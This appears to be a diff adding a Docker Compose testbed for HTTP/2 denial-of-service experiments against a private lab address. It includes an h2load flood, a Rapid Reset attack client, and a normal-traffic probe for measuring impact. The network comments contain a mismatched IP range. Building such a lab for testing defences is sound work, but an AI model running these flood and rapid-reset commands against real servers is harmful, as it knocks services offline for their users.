@@ -1,0 +1,40 @@
+services:
+  multiplexed_attacker:
+    build: .
+    command:
+      - h2load
+      - -n200000
+      - -c500
+      - -m500
+      - https://10.0.0.58:443/
+
+  normal_traffic_generator:
+    build: .
+    command:
+      - /bin/sh
+      - -c
+      - |
+        while true; do
+          curl -k -s -o /dev/null -w "Time: %{time_total}s | Code: %{http_code} | Remote: %{remote_ip}\n" --http2 https://10.0.0.58:443/
+          sleep 1
+        done
+
+  rapidreset_attacker:
+    build: .
+    command:
+      - /bin/sh
+      - -c
+      - |
+        /usr/local/bin/rapidresetclient -requests=20000 -url https://10.0.0.58:443/ -wait=5 -delay=1 -concurrency=100
+
+
+networks:
+  testing_net:
+    driver: macvlan
+    driver_opts:
+      parent: eth0 
+    ipam:
+      config:
+        - subnet: 10.0.0.0/8     #CHANGE to your network subnet
+          gateway: 10.1.0.1       #CHANGE to your router/gateway IP
+          ip_range: 10.200.0.200/29  #This allocates 10.0.0.200 through 10.0.0.207
